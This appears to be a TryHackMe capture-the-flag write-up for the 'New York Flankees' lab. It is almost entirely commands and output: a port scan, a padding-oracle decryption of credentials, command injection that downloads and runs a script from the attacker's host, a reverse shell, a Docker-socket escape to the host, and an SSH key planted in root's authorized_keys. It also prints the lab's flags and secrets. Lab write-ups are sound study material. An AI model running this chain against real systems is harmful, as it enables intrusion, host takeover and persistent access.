---
tags:
title: New York Flankees - Medium (THM)
permalink: /New-York-Flankees-THM-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash 
zs1n@ptw ~> nmapf 10.65.132.234
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-25 12:54 -0400
Initiating Ping Scan at 12:54
Scanning 10.65.132.234 [4 ports]
Completed Ping Scan at 12:54, 0.43s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:54
Completed Parallel DNS resolution of 1 host. at 12:54, 0.50s elapsed
Initiating SYN Stealth Scan at 12:54
Scanning 10.65.132.234 [65535 ports]
Discovered open port 8080/tcp on 10.65.132.234
Discovered open port 22/tcp on 10.65.132.234
Completed SYN Stealth Scan at 12:54, 7.28s elapsed (65535 total ports)
Nmap scan report for 10.65.132.234
Host is up, received echo-reply ttl 62 (0.18s latency).
Scanned at 2026-03-25 12:54:27 EDT for 8s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 62
8080/tcp open  http-proxy syn-ack ttl 61

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 8.39 seconds
           Raw packets sent: 68324 (3.006MB) | Rcvd: 67532 (2.701MB)
-e [*] IP: 10.65.132.234
[*] Puertos abiertos: 22,8080
/usr/bin/xclip
-e [*] Service scanning with nmap against 22,8080 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-25 12:54 -0400
Nmap scan report for 10.65.132.234
Host is up (0.22s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 47:a2:83:7c:8c:3b:ac:4a:bc:af:b4:67:c2:d6:94:de (RSA)
|   256 d1:7f:91:35:28:5c:e6:31:38:27:52:dc:a4:6e:85:da (ECDSA)
|_  256 4a:6f:8d:78:ac:07:86:03:49:8a:04:63:c4:e6:5f:c0 (ED25519)
8080/tcp open  http    Octoshape P2P streaming web service
|_http-title: Hello world!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.39 seconds
```


![[Pasted image 20260325140444.png]]

![[Pasted image 20260325141041.png]]


![[Pasted image 20260325141019.png]]

![[Pasted image 20260325142726.png]]


![[Pasted image 20260325142718.png]]

```bash
zs1n@ptw ~> perl padBuster.pl http://10.65.132.234:8080/api/debug/39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4 "39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4" 16 -encoding 2

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 29

INFO: Starting PadBuster Decrypt Mode
*** Starting Block 1 of 4 ***

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID#	Freq	Status	Length	Location
-------------------------------------------------------
1	1	200	29	N/A
2 **	255	500	16	N/A
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2

Continuing test with selection 2

[+] Success: (133/256) [Byte 16]
..snip..

Block 4 Results:
[+] Cipher Text (HEX): ea0dcc6e567f96414433ddf5dc29cdd5
[+] Intermediate Bytes (HEX): 4a4153075457000800050d565601047a
[+] Plain Text: stefan1197:ebb2B76@62#f??7cA6B76@6!@62#f6dacd2599
```


![[Pasted image 20260325145034.png]]

![[Pasted image 20260325145058.png]]

```bash
/api/admin/exec?cmd=curl+192.168.210.140+-o+/tmp/bash.sh
```

```bash
chmod +x /tmp/bash.sh
```

```bash
/tmp/bash.sh
```


```bash
zs1n@ptw ~> sudo nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.210.140] from (UNKNOWN) [10.65.132.234] 53632
/bin/sh: 0: can't access tty; job control turned off
# script /dev/null -qc bash
root@02e849f307cc:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
root@02e849f307cc:/app# cat docker-compose.yml
version: "3"
services:
  web:
    build: .
    ports:
      - "8080:8080"
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
    restart: always
    environment:
      - CTF_USERNAME=stefan1197
      - CTF_PASSWORD=ebb2B76@62#f??7cA6B76@6!@62#f6dacd2599
      - CTF_ENCRYPTION_KEY=2d3981f51f18b0b9568521bb39f06e5b
      - CTF_ENCRYPTION_IV=956a591992734c68
      - CTF_RESOURCES=/app/src/resources
      - CTF_DOCKER_FLAG=THM{342878cd14051bd787352ee73c75381b1803491e4e5ac729a91a03e3c889c2bf}
      - CTF_ADMIN_PANEL_FLAG=THM{a4113536187c6e84637a1ee2ec5359eca17bbbd1b2629b23dbfd3b4ce2f30604}root@02e849f307cc:/app# cat docker-compose.yml; echo
version: "3"
services:
  web:
    build: .
    ports:
      - "8080:8080"
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
    restart: always
    environment:
      - CTF_USERNAME=stefan1197
      - CTF_PASSWORD=ebb2B76@62#f??7cA6B76@6!@62#f6dacd2599
      - CTF_ENCRYPTION_KEY=2d3981f51f18b0b9568521bb39f06e5b
      - CTF_ENCRYPTION_IV=956a591992734c68
      - CTF_RESOURCES=/app/src/resources
      - CTF_DOCKER_FLAG=THM{342878cd14051bd787352ee73c75381b1803491e4e5ac729a91a03e3c889c2bf}
      - CTF_ADMIN_PANEL_FLAG=THM{a4113536187c6e84637a1ee2ec5359eca17bbbd1b2629b23dbfd3b4ce2f30604}
```

```bash
root@02e849f307cc:/tmp# wget 192.168.210.140/lin.sh; chmod +x lin.sh; ./lin.sh
```

```bash
root@02e849f307cc:/tmp# docker images
REPOSITORY               TAG       IMAGE ID       CREATED         SIZE
padding-oracle-app_web   latest    cd6261dd9dda   22 months ago   1.01GB
<none>                   <none>    4187efabd0a5   22 months ago   704MB
gradle                   7-jdk11   d5954e1d9fa4   23 months ago   687MB
openjdk                  11        47a932d998b7   3 years ago     654MB
```

```bash
root@02e849f307cc:/tmp# docker run -it --rm -v /:/host openjdk:11 /bin/bash
root@abe06b73b0d7:/# ls
bin  boot  dev	etc  home  host  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
root@abe06b73b0d7:/# cd host/
root@abe06b73b0d7:/host# ls
bin  boot  dev	etc  flag.txt  home  lib  lib32  lib64	libx32	lost+found  media  mnt	opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var
root@abe06b73b0d7:/host# cat flag.txt
THM{b3653cb04abf4a5b9c7a77ec52f550e73416b6e61015b8014fff9831a7eb61ce}
```

```bash
root@abe06b73b0d7:/host/root/.ssh# echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFrl3lUceDWKm4BMhFXeAxeKRT8CaeTV6U+HtGpwSJfI root@kali" > authorized_keys
```

```bash
└─# ssh -i /root/.ssh/id_ed25519 root@10.65.132.234
The authenticity of host '10.65.132.234 (10.65.132.234)' can't be established.
ED25519 key fingerprint is: SHA256:ZmPz+XiNF9snHSXUyGQIC6EaW9dBfNwzg+Nyk48h4fA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.65.132.234' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-1077-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Mar 25 18:07:40 UTC 2026

  System load:  0.01               Processes:             168
  Usage of /:   12.2% of 38.70GB   Users logged in:       0
  Memory usage: 14%                IPv4 address for eth0: 10.65.132.234
  Swap usage:   0%

  => There are 45 zombie processes.

 * Ubuntu Pro delivers the most comprehensive open source security and
   compliance features.

   https://ubuntu.com/aws/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@ip-10-65-132-234:~# ls
snap
root@ip-10-65-132-234:~# id
uid=0(root) gid=0(root) groups=0(root)
```